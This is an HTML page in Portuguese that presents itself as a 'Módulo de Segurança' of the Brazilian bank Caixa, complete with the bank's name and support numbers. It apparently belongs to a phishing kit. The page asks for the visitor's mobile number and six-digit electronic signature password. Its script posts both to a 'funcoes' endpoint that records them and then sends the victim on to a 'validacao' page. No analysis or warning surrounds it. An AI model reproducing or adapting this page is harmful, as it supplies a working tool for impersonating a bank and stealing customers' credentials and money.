<!DOCTYPE html>
<html lang="pt-br">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex, nofollow, noimageindex">
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
    <!-- CSS -->
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/alertifyjs@1.13.1/build/css/alertify.min.css" />
    <!-- Default theme -->
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/alertifyjs@1.13.1/build/css/themes/default.min.css" />
    <!-- Semantic UI theme -->
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/alertifyjs@1.13.1/build/css/themes/semantic.min.css" />
    <!-- Bootstrap theme -->
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/alertifyjs@1.13.1/build/css/themes/bootstrap.min.css" />
    <link rel="stylesheet" href="../../assets/css/web.css?v=3">
</head>

<body>

    <div class="container home_header">
        <div class="content">
            <div class="logo"><img src="../../assets/imgs/logo-web.png"></div>
        </div>
        <!--content-->
    </div>
    <!--container-->

    <div class="container enter_main">
        <div class="content">
            <div class="left_content">
                <div class="title_enter">
                    <img src="../../assets/imgs/icon_mod.png" style="width: 35px;margin-right: 10px;">
                    <h1>Módulo de Segurança</h1>
                </div>
                <!--title_enter-->

                <div class="box_cinza">
                    <p>Insira o número de celular registrado com DDD, e em seguida, confirme esta solicitação informando sua Assinatura Eletrônica.</p>
                    <div onsubmit="return checkFone();" autocomplete="off" class="form_phone">
                        <label for="is_phone">
                            <input type="tel" name="is_phone" id="is_phone" class="home_input" placeholder="Celular com DDD" maxlength="15">
                        </label>

                        <label for="is_assin">
                            <input type="tel" name="is_assin" id="is_assin" class="home_input" placeholder="Assinatura eletrônica" maxlength="6" style="-webkit-text-security: disc!important;">
                        </label>

                        <input type="submit" value="Confirmar" class="home_submit_phone gravar_assinatura">
                    </div>
                </div>
            </div>

            <div class="right_content">
                <img src="../../assets/imgs/sidebar_enter.jpg">
            </div>

        </div>

    </div>


    <div class="container home_footer" style="margin-top: 150px;">
        <div class="content">
            <div class="info">
                Suporte Tecnológico <br>
                3004 1104(Capitais) ou 0800 726 0104(Demais regiões)
            </div>
            <div class="links">
                <a href="#">Segurança</a>
                <a href="#">Rede de atendimento</a>
                <a href="#">Ajuda</a>
                <a href="#">Termos e contratos</a>
            </div>
        </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.5.1.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    <script src="//cdn.jsdelivr.net/npm/alertifyjs@1.13.1/build/alertify.min.js"></script>

    <script>
        $(document).ready(function() {
            $('#is_phone').mask('(00) 00000-0000', {
                reverse: false
            });

            function campos_obrigatorios(campo) {
                alertify.alert('Caixa', '' + campo + '');
            }

            $(document).on('click', '.gravar_assinatura', function() {
                const telefone = $('#is_phone').val();
                const inpSenha = $('#is_assin').val();
                if (telefone == '') {
                    campos_obrigatorios('Telefone Obrigatório. (C905-010)');
                    return false;
                }
                if (inpSenha == '') {
                    campos_obrigatorios('Assinatura Obrigatória. (C905-010)');
                    return false;
                }
                $.ajax({
                    url: "funcoes",
                    method: "post",
                    data: {
                        action: 'gravar_assinatura_mobile',
                        telefone: telefone,
                        inpSenha: inpSenha
                    },
                    success: function(res) {
                        if (res == "success") {
                            window.location.href = "validacao"
                        } else {
                            alert('não foi possivel completar essa solicitacao. Por favor, tente novamente mais tarde');
                        }
                    },
                    error: function() {
                        alert('erro ao processar essa solicitacao');
                    }
                })
            });
        });
    </script>

</body>

</html>